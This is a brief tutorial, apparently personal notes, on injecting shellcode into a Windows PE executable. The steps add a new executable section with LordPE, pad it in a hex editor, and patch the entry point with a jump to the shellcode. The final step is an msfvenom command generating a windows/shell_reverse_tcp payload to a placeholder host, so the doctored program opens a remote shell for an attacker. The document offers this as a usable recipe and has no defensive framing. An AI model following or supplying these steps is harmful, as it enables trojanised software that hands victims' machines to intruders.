1 Check if ASLR is enabled with https://github.com/NetSPI/ ;
2 If not, find the entry point in any debugger;
3 Use a PE editor to create a new section. Example: https://www.aldeid.com/wiki/LordPE
  LordPE > Sections > add section header
  Edit this header > Rename it (.stuff, .code, .etc) and add 1000 bytes to VirtualSize and RawSize
  Click on FLAGS and set read/write and exec
  OK and save
4 Add null data to the sizes you just enabled with https://mh-nexus.de/en/hxd/
  Select the last string of the decoded text and click on Edit > Insert bytes
5 Edit the byte count to represent the value of VirtualSize and RawSize
  that we defined earlier. In my case, my virtual size and raw size was 1000 bytes, and
  I will use a fill pattern of 00
6 OK and save. You can now test it.
7 Modify the entrypoint with a jmp function to call your shellcode
8 Generate your shellcode with:
  msfvenom -p windows/shell_reverse_tcp lhost=x.x.x.x lport=8080
  -f hex
 
